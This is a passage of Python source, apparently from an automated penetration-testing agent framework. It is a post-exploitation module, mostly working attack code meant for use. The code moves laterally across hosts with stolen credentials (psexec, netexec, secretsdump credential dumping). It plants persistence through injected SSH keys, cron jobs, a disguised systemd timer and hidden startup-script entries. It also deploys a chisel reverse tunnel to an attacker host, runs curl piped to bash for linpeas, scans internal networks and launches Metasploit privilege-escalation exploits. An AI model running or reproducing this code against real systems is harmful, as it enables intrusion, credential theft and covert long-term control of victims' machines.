                            "host": host, "user": user, "method": "netexec_smb",
                            "output": (result.stdout or "")[:500],
                        })
                        await self._log(log_callback, f"[PostAgent] ✅ SMB 横向成功: {user}@{host}")
                        continue
                except Exception as e:
                    logger.debug(f"[PostAgent] netexec smb {host}: {e}")

                # --- smbmap ---
                try:
                    result = await self.executor.run(
                        tool="smbmap",
                        args=["-H", host, "-u", user, "-p", password],
                        timeout=30, task_id=task_id,
                    )
                    if result.success and ("[+]" in (result.stdout or "") or "READ" in (result.stdout or "")):
                        lateral_successes.append({
                            "host": host, "user": user, "method": "smbmap",
                            "output": (result.stdout or "")[:500],
                        })
                        await self._log(log_callback, f"[PostAgent] ✅ smbmap 横向成功: {user}@{host}")
                        continue
                except Exception as e:
                    logger.debug(f"[PostAgent] smbmap {host}: {e}")

                # --- impacket-psexec (remote command execution) ---
                try:
                    result = await self.executor.run(
                        tool="impacket-psexec",
                        args=[f"{user}:{password}@{host}", "whoami"],
                        timeout=30, task_id=task_id,
                    )
                    if result.success and ("uid=" in (result.stdout or "").lower() or "nt authority" in (result.stdout or "").lower()):
                        lateral_successes.append({
                            "host": host, "user": user, "method": "impacket-psexec",
                            "output": (result.stdout or "")[:500],
                        })
                        await self._log(log_callback, f"[PostAgent] ✅ impacket-psexec 横向成功: {user}@{host}")
                        continue
                except Exception as e:
                    logger.debug(f"[PostAgent] impacket-psexec {host}: {e}")

                # --- impacket-secretsdump (credential dumping) ---
                if password or nt_hash:
                    try:
                        dump_args = [f"{user}:{password}@{host}"] if password else [f"{user}@{host}", "-hashes", f":{nt_hash}"]
                        result = await self.executor.run(
                            tool="impacket-secretsdump",
                            args=dump_args,
                            timeout=60, task_id=task_id,
                        )
                        if result.success and ":::" in (result.stdout or ""):
                            lateral_successes.append({
                                "host": host, "user": user, "method": "impacket-secretsdump",
                                "output": (result.stdout or "")[:500],
                            })
                            await self._log(log_callback, f"[PostAgent] ✅ secretsdump 横向成功: {user}@{host}")
                            continue
                    except Exception as e:
                        logger.debug(f"[PostAgent] impacket-secretsdump {host}: {e}")

                # --- SSH (netexec ssh / impacket) ---
                if target_os != "windows":
                    try:
                        result = await self.executor.run(
                            tool="netexec",
                            args=["ssh", host, "-u", user, "-p", password],
                            timeout=30, task_id=task_id,
                        )
                        if result.success and ("[+]" in (result.stdout or "") or "Pwn3d" in (result.stdout or "")):
                            lateral_successes.append({
                                "host": host, "user": user, "method": "netexec_ssh",
                                "output": (result.stdout or "")[:500],
                            })
                            await self._log(log_callback, f"[PostAgent] ✅ SSH 横向成功: {user}@{host}")
                            continue
                    except Exception as e:
                        logger.debug(f"[PostAgent] netexec ssh {host}: {e}")

                # --- WMI (netexec wmi) ---
                try:
                    result = await self.executor.run(
                        tool="netexec",
                        args=["wmi", host, "-u", user, "-p", password],
                        timeout=30, task_id=task_id,
                    )
                    if result.success and ("[+]" in (result.stdout or "") or "Pwn3d" in (result.stdout or "")):
                        lateral_successes.append({
                            "host": host, "user": user, "method": "netexec_wmi",
                            "output": (result.stdout or "")[:500],
                        })
                        await self._log(log_callback, f"[PostAgent] ✅ WMI 横向成功: {user}@{host}")
                        continue
                except Exception as e:
                    logger.debug(f"[PostAgent] netexec wmi {host}: {e}")

        findings["lateral_successes"] = lateral_successes
        findings.setdefault("discovered_hosts", lateral_hosts[:20])
        return {"status": "ok", "lateral_hosts": lateral_hosts, "findings": findings}

    async def run_persistence(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """Establish persistence on the compromised host.

        Uses pwncat-cs for SSH key deployment, RCE template for
        crontab / systemd timer / startup script persistence.
        """
        successful = [r for r in exploit_results if r.success]
        if not successful:
            await self._log(log_callback, "[PostAgent] 持久化跳过：无成功利用")
            return {"status": "skipped", "methods": []}

        first = successful[0]
        rce_template = _extract_rce_template(first)
        methods: list[dict[str, Any]] = []

        if rce_template and first.exploit_level in ("rce", ""):
            async def _rce(cmd: str, timeout: int = 30) -> str:
                try:
                    return await _run_cmd_via_rce(rce_template, cmd, task_id, timeout=timeout)
                except Exception:
                    return ""

            # ── 1. pwncat-cs SSH key persistence ────────────
            lhost = os.getenv("LHOST", "")
            if lhost:
                try:
                    pubkey_out = await _rce(
                        "cat /root/.ssh/authorized_keys 2>/dev/null; "
                        "cat /home/*/.ssh/authorized_keys 2>/dev/null",
                        timeout=10,
                    )
                    pwncat_result = await self.executor.run(
                        tool="pwncat-cs",
                        args=[
                            f"{lhost}", "--port", os.getenv("LPORT", "4444"),
                            "--identity", "/tmp/.pentest_key",
                        ],
                        timeout=15, task_id=task_id,
                    )
                    if pwncat_result.success and ("connected" in (pwncat_result.stdout or "").lower()):
                        methods.append({"type": "pwncat-cs_ssh", "target": lhost, "status": "ok"})
                        await self._log(log_callback, "[PostAgent] ✅ pwncat-cs SSH 持久化成功")
                except Exception as e:
                    logger.debug(f"[PostAgent] pwncat-cs persistence failed: {e}")

            # ── 2. SSH key deployment (authorized_keys) ─────
            ssh_key_out = await _rce(
                "mkdir -p /root/.ssh /home/*/.ssh 2>/dev/null; "
                "ssh-keygen -t rsa -f /tmp/.pentest_key -N '' -q 2>/dev/null; "
                "cat /tmp/.pentest_key.pub >> /root/.ssh/authorized_keys 2>/dev/null; "
                "for d in /home/*/; do "
                "  cat /tmp/.pentest_key.pub >> \"$d.ssh/authorized_keys\" 2>/dev/null; "
                "done; "
                "echo PERSISTENCE_SSH_OK || echo PERSISTENCE_SSH_FAIL"
            )
            if "PERSISTENCE_SSH_OK" in ssh_key_out:
                methods.append({
                    "type": "ssh_key",
                    "target": "/root/.ssh/authorized_keys",
                    "status": "ok",
                })

            # ── 3. Crontab persistence ──────────────────────
            cron_out = await _rce(
                "(crontab -l 2>/dev/null; "
                "echo '*/5 * * * * /tmp/.health_check.sh') | "
                "crontab - 2>/dev/null && "
                "echo PERSISTENCE_CRON_OK || echo PERSISTENCE_CRON_FAIL"
            )
            if "PERSISTENCE_CRON_OK" in cron_out:
                methods.append({
                    "type": "crontab",
                    "schedule": "*/5 * * * *",
                    "status": "ok",
                })

            # ── 4. Systemd timer persistence ────────────────
            systemd_out = await _rce(
                "cat > /etc/systemd/system/pentest-sync.service << 'EOF' 2>/dev/null\n"
                "[Unit]\nDescription=Pentest Sync Service\n\n"
                "[Service]\nType=oneshot\n"
                "ExecStart=/tmp/.health_check.sh\n\n"
                "[Install]\nWantedBy=multi-user.target\n"
                "EOF\n"
                "cat > /etc/systemd/system/pentest-sync.timer << 'EOF' 2>/dev/null\n"
                "[Unit]\nDescription=Pentest Sync Timer\n\n"
                "[Timer]\nOnBootSec=5min\nOnUnitActiveSec=30min\n\n"
                "[Install]\nWantedBy=timers.target\n"
                "EOF\n"
                "systemctl daemon-reload 2>/dev/null; "
                "systemctl enable pentest-sync.timer 2>/dev/null; "
                "systemctl start pentest-sync.timer 2>/dev/null && "
                "echo PERSISTENCE_SYSTEMD_OK || echo PERSISTENCE_SYSTEMD_FAIL"
            )
            if "PERSISTENCE_SYSTEMD_OK" in systemd_out:
                methods.append({
                    "type": "systemd_timer",
                    "unit": "pentest-sync.timer",
                    "status": "ok",
                })

            # ── 5. Startup script persistence ───────────────
            startup_out = await _rce(
                "echo '/tmp/.health_check.sh &' >> /etc/rc.local 2>/dev/null; "
                "chmod +x /etc/rc.local 2>/dev/null; "
                "echo '/tmp/.health_check.sh &' >> /root/.bashrc 2>/dev/null; "
                "echo '/tmp/.health_check.sh &' >> /root/.profile 2>/dev/null; "
                "for d in /home/*/; do "
                "  echo '/tmp/.health_check.sh &' >> \"$d.bashrc\" 2>/dev/null; "
                "done; "
                "echo PERSISTENCE_STARTUP_OK"
            )
            if "PERSISTENCE_STARTUP_OK" in startup_out:
                methods.append({
                    "type": "startup_scripts",
                    "targets": ["/etc/rc.local", "/root/.bashrc", "/root/.profile"],
                    "status": "ok",
                })

            await self._log(
                log_callback,
                f"[PostAgent] 持久化完成: {len(methods)} 种方法 ({', '.join(m['type'] for m in methods) or '无'})",
            )

        return {"status": "ok", "methods": methods}

    async def run_internal_scan(
        self,
        exploit_results: list[ExploitResult],
        target_os: str = "unknown",
        task_id: Optional[str] = None,
        *,
        log_callback: LogCb = None,
        record_callback: RecordCb = None,
    ) -> dict[str, Any]:
        """Discover and scan internal networks from the compromised host.

        Sets up proxychains4 / chisel pivoting, runs nmap and netexec
        scans through the pivot, and collects port/service info for
        each discovered internal host. Results are structured so
        vuln_agent can later scan internal targets.
        """
        successful = [r for r in exploit_results if r.success]
        if not successful:
            await self._log(log_callback, "[PostAgent] 内网扫描跳过：无成功利用")
            return {"status": "skipped", "subnets": [], "hosts": []}

        first = successful[0]
        rce_template = _extract_rce_template(first)
        session_id = (first.session_info or {}).get("session_id")
        subnets: list[str] = []
        hosts: list[dict[str, Any]] = []
        scan_results: list[dict[str, Any]] = []

        async def _rce(cmd: str, timeout: int = 60) -> str:
            try:
                return await _run_cmd_via_rce(rce_template, cmd, task_id, timeout=timeout)
            except Exception:
                return ""

        if rce_template and first.exploit_level in ("rce", ""):
            # ── Phase 1: network discovery ──────────────────
            iface_out = await _rce("ip addr show 2>/dev/null || ifconfig 2>/dev/null")
            route_out = await _rce("ip route 2>/dev/null || route -n 2>/dev/null")
            arp_out = await _rce("arp -a 2>/dev/null || ip neigh 2>/dev/null")

            for line in (iface_out + "\n" + route_out).splitlines():
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.0/\d{1,2})", line):
                    subnet = m.group(1)
                    if subnet not in subnets and not subnet.startswith("127."):
                        subnets.append(subnet)
            await self._log(log_callback, f"[PostAgent] 发现 {len(subnets)} 个内网子网")

            # ── Phase 2: setup pivoting (chisel) ────────────
            pivot_ready = False
            lhost = os.getenv("LHOST", "")
            if lhost and subnets:
                try:
                    # Deploy chisel client on target
                    chisel_deploy = await _rce(
                        f"curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/"
                        f"chisel_1.9.1_linux_amd64.gz -o /tmp/chisel.gz 2>/dev/null && "
                        f"gunzip -f /tmp/chisel.gz 2>/dev/null && "
                        f"chmod +x /tmp/chisel 2>/dev/null && "
                        f"nohup /tmp/chisel client {lhost}:1080 R:0.0.0.0:1081:socks "
                        f">/dev/null 2>&1 & echo CHISEL_DEPLOYED",
                        timeout=30,
                    )
                    if "CHISEL_DEPLOYED" in chisel_deploy:
                        pivot_ready = True
                        await self._log(log_callback, "[PostAgent] ✅ chisel 代理已部署")
                except Exception as e:
                    logger.debug(f"[PostAgent] chisel deploy failed: {e}")

            # ── Phase 3: ping sweep discover live hosts ─────
            for subnet in subnets[:3]:
                await self._log(log_callback, f"[PostAgent] ping sweep: {subnet}")
                scan_out = await _rce(
                    f"for i in $(seq 1 254); do "
                    f"(ping -c 1 -W 1 {subnet.rsplit('.', 1)[0]}.$i 2>/dev/null | "
                    f"grep 'bytes from' &); done; wait 2>/dev/null | head -50",
                    timeout=120,
                )
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", scan_out):
                    ip = m.group(1)
                    if not any(h.get("ip") == ip for h in hosts):
                        hosts.append({"ip": ip, "source": "ping_sweep", "subnet": subnet})

            # ARP neighbours
            for line in arp_out.splitlines():
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", line):
                    ip = m.group(1)
                    if ip not in ("127.0.0.1", "0.0.0.0") and not any(h.get("ip") == ip for h in hosts):
                        hosts.append({"ip": ip, "source": "arp"})

            await self._log(log_callback, f"[PostAgent] 发现 {len(hosts)} 台内网存活主机")

            # ── Phase 4: nmap scan (via proxychains if pivot ready) ──
            for host_entry in hosts[:10]:
                ip = host_entry["ip"]
                try:
                    if pivot_ready and lhost:
                        # Run nmap through proxychains via chisel SOCKS proxy
                        nmap_cmd = (
                            f"proxychains4 -q nmap -sT -sV -T4 -F --open "
                            f"-oG /tmp/nmap_{ip.replace('.', '_')}.gnmap {ip} 2>/dev/null"
                        )
                        nmap_out = await _rce(nmap_cmd, timeout=120)
                    else:
                        # Fallback: basic port scan from compromised host
                        nmap_out = await _rce(
                            f"for port in 22 80 443 445 139 135 3306 5432 6379 8080 8443 3389 21 23 25 53 111 2049; "
                            f"do (echo >/dev/tcp/{ip}/$port) 2>/dev/null && echo OPEN:$port; done",
                            timeout=90,
                        )
                    if nmap_out.strip():
                        # Parse open ports
                        open_ports: list[int] = []
                        for m in re.finditer(r"(?:OPEN:|(\d+)/open)", nmap_out):
                            port_str = m.group(1) or m.group(0).replace("OPEN:", "")
                            try:
                                open_ports.append(int(port_str))
                            except ValueError:
                                pass
                        host_entry["open_ports"] = sorted(set(open_ports))
                        scan_results.append({
                            "ip": ip,
                            "open_ports": host_entry["open_ports"],
                            "scan_type": "nmap_proxychains" if pivot_ready else "bash_tcp_probe",
                            "raw_output": nmap_out[:2000],
                        })
                except Exception as e:
                    logger.debug(f"[PostAgent] internal scan {ip}: {e}")

            # ── Phase 5: netexec SMB scan on discovered hosts ──
            for host_entry in hosts[:10]:
                ip = host_entry["ip"]
                try:
                    ne_result = await self.executor.run(
                        tool="netexec",
                        args=["smb", ip],
                        timeout=30, task_id=task_id,
                    )
                    if ne_result.success and (ne_result.stdout or "").strip():
                        for entry in scan_results:
                            if entry["ip"] == ip:
                                entry.setdefault("netexec_smb", (ne_result.stdout or "")[:1000])
                                break
                except Exception:
                    pass

            await self._log(
                log_callback,
                f"[PostAgent] 内网扫描完成: {len(subnets)} 子网, {len(hosts[:50])} 主机, "
                f"{len(scan_results)} 主机有开放端口",
            )

        elif session_id:
            # MSF session fallback: basic discovery
            try:
                arp_raw = await self.msf.run_session_command(session_id, "arp -a 2>/dev/null")
                for m in re.finditer(r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", arp_raw):
                    ip = m.group(1)
                    if ip not in ("127.0.0.1", "0.0.0.0"):
                        hosts.append({"ip": ip, "source": "msf_arp"})
            except Exception:
                pass

        return {
            "status": "ok",
            "subnets": subnets,
            "hosts": hosts[:50],
            "scan_results": scan_results[:20],
            # Structured for vuln_agent consumption:
            # vuln_agent can iterate scan_results[].ip + scan_results[].open_ports
        }

    def _post_via_react_evidence(self, result: ExploitResult, target_os: str) -> dict[str, Any]:
        """兼容旧逻辑：单阶段摘要。"""
        r = self._post_foothold_from_evidence(result, target_os)
        return {
            "status": "completed",
            "final_privilege": r.get("final_privilege", "unknown"),
            "findings": r.get("findings", {}),
        }

    def _heuristic_privesc_hints(self, blob: str, target_os: str) -> dict[str, Any]:
        low = blob.lower()
        return {
            "method": "evidence_heuristic",
            "suid_mentioned": "suid" in low or ("find /" in low and "-perm" in low),
            "sudo_mentioned": "sudo" in low or "nopasswd" in low,
            "kernel_hint": bool(re.search(r"linux version|uname\s+-a|kernel", low)),
            "success": False,
            "target_os": target_os,
        }

    async def _linux_privesc(self, session_id: str) -> dict:
        suid_out = await self.msf.run_session_command(
            session_id, "find / -perm -u=s -type f 2>/dev/null | head -20"
        )
        sudo_out = await self.msf.run_session_command(session_id, "sudo -l 2>/dev/null")
        interesting = ["bash", "vim", "nano", "python", "perl", "find", "nmap", "less", "more"]
        found_suid = [b for b in interesting if b in suid_out]

        # ── linpeas: deeper privesc recon via MSF session ──
        linpeas_highlights: list[str] = []
        try:
            linpeas_out = await self.msf.run_session_command(
                session_id,
                "curl -sL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh "
                "2>/dev/null | timeout 120 bash 2>/dev/null | head -500"
            )
            if linpeas_out and len(linpeas_out) > 100:
                for vec in ["CVE-", "Vulnerable to", "99%", "95%"]:
                    idx = linpeas_out.find(vec)
                    if idx != -1:
                        linpeas_highlights.append(
                            vec + ": " + linpeas_out[idx:idx + 200]
                        )
        except Exception as e:
            logger.debug(f"[PostAgent] linpeas via MSF failed: {e}")

        # ── pspy64: cron / scheduled task monitoring ──
        pspy_output = ""
        try:
            pspy_out = await self.msf.run_session_command(
                session_id,
                "timeout 30 /opt/tools/pspy64 --ppid 2>/dev/null | head -100 || echo __PSPY_MISSING__"
            )
            if pspy_out and "__PSPY_MISSING__" not in pspy_out:
                pspy_output = pspy_out[:1500]
        except Exception as e:
            logger.debug(f"[PostAgent] pspy via MSF failed: {e}")

        # ── Attempt CVE exploitation when linpeas finds known vectors ──
        cve_results = await self._attempt_cve_exploitation(
            session_id=session_id,
            linpeas_highlights=linpeas_highlights,
            via_msf=True,
        )

        any_cve_success = any(r.get("success") for r in cve_results)
        return {
            "method": "suid_sudo_linpeas",
            "suid_binaries": found_suid,
            "sudo_rules": sudo_out[:300],
            "linpeas_highlights": linpeas_highlights[:10],
            "pspy_summary": pspy_output[:1500],
            "cve_attempts": cve_results,
            "success": len(found_suid) > 0 or "NOPASSWD" in sudo_out or any_cve_success,
        }

    async def _windows_privesc(self, session_id: str) -> dict:
        output = await self._run_post_module(
            session_id, "post/multi/recon/local_exploit_suggester"
        )
        return {
            "method": "local_exploit_suggester",
            "output": output[:500],
            "success": "exploitable" in output.lower(),
        }

    async def _run_post_module(self, session_id: str, module_path: str) -> str:
        try:
            _, output = await self.msf.execute_module(
                module_path=module_path,
                options={"SESSION": session_id},
                timeout=30,
            )
            return output
        except Exception as e:
            return f"模块执行失败: {e}"

    async def _attempt_cve_exploitation(
        self,
        *,
        session_id: Optional[str],
        linpeas_highlights: list[str],
        via_msf: bool = False,
        rce_template: Optional[str] = None,
        task_id: Optional[str] = None,
    ) -> list[dict[str, Any]]:
        """Attempt known CVE exploits based on linpeas findings.

        When via_msf=True, uses MSF modules. Otherwise uses RCE template.
        Returns a list of attempt results.
        """
        cve_map: list[tuple[str, str]] = [
            ("CVE-2016-5195", "exploit/linux/local/dirtycow"),
            ("DirtyCow", "exploit/linux/local/dirtycow"),
            ("CVE-2017-1000367", "exploit/linux/local/sudo_baron_samedit"),
            ("CVE-2021-4034", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
            ("PwnKit", "exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec"),
            ("CVE-2021-3493", "exploit/linux/local/cve_2021_3493_overlayfs"),
            ("CVE-2022-0847", "exploit/linux/local/cve_2022_0847_dirtypipe"),
            ("DirtyPipe", "exploit/linux/local/cve_2022_0847_dirtypipe"),
        ]

        if not linpeas_highlights:
            return []

        all_highlights = " ".join(linpeas_highlights).lower()
        attempted_cves: set[str] = set()
        results: list[dict[str, Any]] = []

        for cve_name, msf_module in cve_map:
            if cve_name.lower() not in all_highlights:
                continue
            if cve_name.lower() in attempted_cves:
                continue
            attempted_cves.add(cve_name.lower())

            logger.info(f"[PostAgent] Attempting CVE exploit: {cve_name} ({msf_module})")
            try:
                if via_msf and session_id:
                    _, output = await self.msf.execute_module(
                        module_path=msf_module,
                        options={"SESSION": session_id},
                        timeout=60,
                    )
                    success = "root" in output.lower() or "uid=0" in output.lower()
                    results.append({
                        "cve": cve_name,
                        "module": msf_module,
                        "success": success,
                        "output": output[:500],
                    })
                elif rce_template:
                    # Attempt via direct exploit scripts through RCE template
                    for exploit_cmd in _CVE_EXPLOIT_CMDS.get(cve_name, []):
                        try:
                            out = await _run_cmd_via_rce(
                                rce_template, exploit_cmd, task_id, timeout=30,
                            )
                            if "uid=0" in out or "root" in out.lower():
                                results.append({
                                    "cve": cve_name,
                                    "method": "direct",
                                    "success": True,
                                    "output": out[:500],
                                })
                                break
                        except Exception:
                            continue
                    else:
                        results.append({
                            "cve": cve_name,
                            "success": False,
                            "error": "no direct exploit available for RCE template",
                        })
            except Exception as e:
                logger.debug(f"[PostAgent] CVE attempt {cve_name} failed: {e}")
                results.append({"cve": cve_name, "success": False, "error": str(e)[:200]})

        return results
